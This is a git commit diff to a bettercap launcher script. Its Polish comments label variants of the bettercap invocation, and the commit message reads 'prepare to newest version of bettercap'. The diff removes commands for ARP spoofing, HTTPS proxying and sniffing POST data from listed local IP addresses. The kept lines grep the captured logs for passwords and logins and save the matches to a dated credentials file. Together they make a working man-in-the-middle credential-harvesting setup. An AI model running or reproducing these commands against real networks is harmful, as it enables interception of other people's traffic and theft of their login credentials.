72d207222d36ff5b903c2ffa137ba56fcf277177
jolo2734 <bartek.matejuk.szkola@gmail.com>
2022-01-23 21:52:30 +0000

    prepare to newest version of bettercap

--- bettercap/start_bettercap.sh
+++ bettercap/start_bettercap.sh
@@ -4,12 +4,3 @@
 sudo rm /home/ubuntu/credentials-bettercap/*
 grep -in -E "pass|login|password|user" $HOME/bettercap-logs/* > $HOME/credentials-bettercap/credentials_$(date +%d-%m-%Y_%I:%M%p).txt
 
-#odpalenie programu bettercap
-#sudo bettercap -I wlan0 -S ARP --gateway 192.168.1.254 -X --proxy-https --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
-
-#bez HTTPS
-#sudo bettercap -I wlan0 --gateway 192.168.1.254  -X --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
-
-#z yt
-#sudo bettercap -T 192.168.1.10,192.168.1.9,192.168.1.17 --proxy --proxy-https -P POST --log-timestamp --log /home/ubuntu/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
-sudo bettercap --proxy -P POST --log-timestamp --log $HOME/bettercap-logs/bettercap_$(date +%d-%m-%Y_%I:%M%p).logs
